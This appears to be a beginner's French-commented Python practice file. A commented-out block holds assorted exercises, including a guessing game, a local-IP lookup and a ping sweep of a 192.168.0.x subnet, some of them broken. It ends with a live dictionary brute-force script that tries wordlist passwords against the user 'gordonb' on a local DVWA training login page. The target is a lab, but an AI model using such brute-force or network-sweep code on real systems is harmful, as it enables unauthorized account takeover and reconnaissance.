
#!/usr/bin/python3.6.4
#coding: utf-8
#print("hello \nmod***f***rs")

''' 
comentaire
sur plusier 
ligne
ligne


a = 10
b = 5
print (a+b)

text ="of \"the\" wa"

print ("hello guys %s" %(text))


mylist =["tat","toto"]
mylist2=myliste
mylist=0
print mylist2


maListe = range (15)

liste = list(range (10)) #liste = range (10) crée un objet de type range dans lequels la fonction extend n'existe pas

liste.extend(maListe)

print (liste)


def myfunction (a=0,b=1):
	print (a+b)

			nbvie-=1
			print ("nombre de vie restantes : "+nbvie)
			print ("essaye encore BAAAKAAA:")
myfunction()



	if (nbvie!=0):
		print("vous avez réussi")
	else:
		print("vous avez perdu")


#guess numbers
from random import *
def guessn ():
	nbvie=10
	secret=randint(1,10)
	nbusers=int (input("devinez le nombre secret : "))	
	#while (nbvie != 0 and good==false):
	while (nbusers != secret and nbvie!=0):
		if (nbusers < secret):
			print ("trop petit")
			nbvie-=1
		else:
			print ("trop grand")
			nbvie-=1
		print ("nombre de vie restantes : "+ str(nbvie))
		nbusers=int (input("devinez le nombre secret : "))
	if (nbvie!=0):
		print("vous avez réussi")
	else:
		print("vous avez perdu")

guessn()



#from func import *

#print (addition(5,10))


#ma_voiture = Voiture()
#print (ma_voiture.nom,ma_voiture.vitesse())



import socket

ip=socket.gethostbyname(socket.gethostname())

print (ip)



import os

subnet = "192.168.0."

for i in range(1,255):
	hostname =subnet+str(i)
	response =os.system("ping -n 1 " + hostname)
	if response ==0:
		print(hostname,'is up!')



import easygui

easygui.fileopenbox()

'''


import requests
import time

lines = tuple (open("dico.txt","r"))

#print (lines)


for line in lines:
	time.sleep(1)
	password=line.replace("\n","")
	print ("password test:", password)
	r = requests.post("http://localhost/dvwa/login.php", data = {'username':'gordonb','password':password,'Login': 'login'})
	#print (r.status_code)
	if r.history:
		for resp in r.history:
			if r.url != "http://localhost/dvwa/login.php":
				print ("The password is :", password)
				raise SystemExit(0)



#password fgh











